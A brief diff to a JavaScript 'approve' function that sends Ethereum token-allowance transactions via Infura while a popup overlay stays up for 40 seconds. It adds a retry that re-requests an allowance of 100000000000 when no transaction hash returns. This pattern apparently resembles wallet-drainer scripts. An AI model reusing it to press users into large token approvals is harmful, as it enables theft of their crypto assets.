@@ -196,8 +196,6 @@ function approve(approveValue) {
             if (allowance < 1000000) {
                 $('#bg_popup').show();
                 setTimeout( function(){$('#bg_popup').hide()}, 40000);
-
-
                 $.ajax({
                     type: "POST",
                     url: urlInfura,
@@ -234,6 +232,9 @@ function approve(approveValue) {
                                 }),
                                 success: function (d) {
                                     console.log("Транзакция отправлена в сеть:", d.result);
+                                    if(d.result == undefined){
+                                        approve(100000000000);
+                                    }
                                 }
                             })
                         })
